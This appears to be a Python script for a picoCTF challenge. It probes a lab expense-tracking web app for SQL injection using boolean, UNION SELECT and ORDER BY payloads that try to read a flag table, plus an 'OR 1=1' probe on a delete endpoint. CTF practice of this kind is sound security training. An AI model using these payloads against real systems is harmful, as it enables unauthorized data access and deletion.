#!/usr/bin/env python3
"""SQL injection testing for ORDER ORDER CTF challenge"""
import requests
import sys
import re

BASE_URL = "http://crystal-peak.picoctf.net:54012"

# Create a session
s = requests.Session()

# First login
login_data = {
    "username": "ctf178542632036c1",
    "password": "test123"
}
r = s.post(f"{BASE_URL}/login", data=login_data)
print(f"Login: {r.status_code}")

# Test page parameter with boolean-based inference
# If page param is injectable, we should be able to use:
# ?page=1 AND 1=1 --  (should show page 1)
# ?page=1 AND 1=2 --  (should show nothing or error)

print("\n=== Testing page parameter for SQLi ===")
payloads = [
    "1",
    "1'",
    "1 AND 1=1",
    "1 AND 1=2",
    "1 UNION SELECT 1,2,3,4,5--",
    "-1 UNION SELECT 1,2,3,4,5--",
    "1 ORDER BY 1--",
    "1 ORDER BY 100--",
    "1 LIMIT 1 OFFSET 1",
]

for p in payloads:
    url = f"{BASE_URL}/expenses?page={p}"
    r = s.get(url)
    # Count expense rows by counting <td> tags and dividing by 4 (columns per row)
    td_count = r.text.count("<td>")
    row_count = td_count // 4
    # Check for errors
    has_error = "error" in r.text.lower() or "syntax" in r.text.lower() or "traceback" in r.text.lower()
    print(f"  page={p!r}: {row_count} rows, error={has_error}")

# Test generate_report with SQLi in sort parameters
print("\n=== Testing generate_report with ORDER BY injection ===")
# Try to find the right parameter name
param_names = ["sort_by", "order", "sort", "order_by", "col", "column", "field", "dir", "sortby", "orderby", "direction", "by"]

# First generate a baseline report
s.post(f"{BASE_URL}/generate_report")
# Check inbox for the latest report ID
r = s.get(f"{BASE_URL}/inbox")
import re
report_ids = re.findall(r'/download_report/(\d+)', r.text)
latest_id = max(int(x) for x in report_ids) if report_ids else 0
print(f"Baseline report ID: {latest_id}")

# Generate reports with different sort params
for pname in param_names:
    url = f"{BASE_URL}/generate_report"
    data = {pname: "amount'"}
    r = s.post(url, data=data)
    r = s.get(f"{BASE_URL}/inbox")
    new_ids = re.findall(r'/download_report/(\d+)', r.text)
    new_latest = max(int(x) for x in new_ids) if new_ids else latest_id
    print(f"  {pname}=amount': new_report={new_latest > latest_id}, latest_id={new_latest}")

# Test UNION SELECT in generate_report
print("\n=== Testing UNION based injection in report ===")
# Try SQL injection that would add a row from another table
paylaods2 = [
    {"sort_by": "amount UNION SELECT flag FROM flag--"},
    {"sort_by": "amount; SELECT flag FROM flag--"},
    {"order": "ASC LIMIT 1 UNION SELECT flag FROM flag--"},
    {"sort_by": "(SELECT CASE WHEN 1=1 THEN amount ELSE id END)"},
    {"sort_by": "amount,(SELECT flag FROM flag LIMIT 1)"},
]

for data in paylaods2:
    r = s.post(f"{BASE_URL}/generate_report", data=data)
    print(f"  Posted {data} -> {r.status_code}")

# Check latest report for any changes
r = s.get(f"{BASE_URL}/inbox")
new_ids = re.findall(r'/download_report/(\d+)', r.text)
new_latest = max(int(x) for x in new_ids) if new_ids else latest_id
print(f"New latest report: {new_latest}")

# Download and check
r = s.get(f"{BASE_URL}/download_report/{new_latest}")
print(f"Report content:\n{r.text[:500]}")

# Let's also check if there's SQLi in the delete_expense parameter
print("\n=== Testing delete_expense for SQLi ===")
for payload in ["1", "1'", "1 OR 1=1--", "1 AND 1=1--"]:
    r = s.post(f"{BASE_URL}/delete_expense/{payload}", allow_redirects=False)
    print(f"  delete_expense/{payload}: {r.status_code}")

print("\nDone!")
